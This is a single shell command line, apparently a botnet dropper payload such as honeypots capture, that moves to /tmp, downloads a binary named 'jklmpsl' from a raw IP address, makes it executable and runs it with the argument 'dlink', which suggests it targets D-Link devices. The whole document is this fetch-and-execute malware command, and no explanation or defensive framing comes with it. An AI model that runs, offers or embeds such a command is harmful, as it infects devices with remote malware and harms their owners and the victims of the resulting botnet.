cd /tmp;wget http://45.88.67.38/jklmpsl; chmod 777 jklmpsl; ./jklmpsl dlink
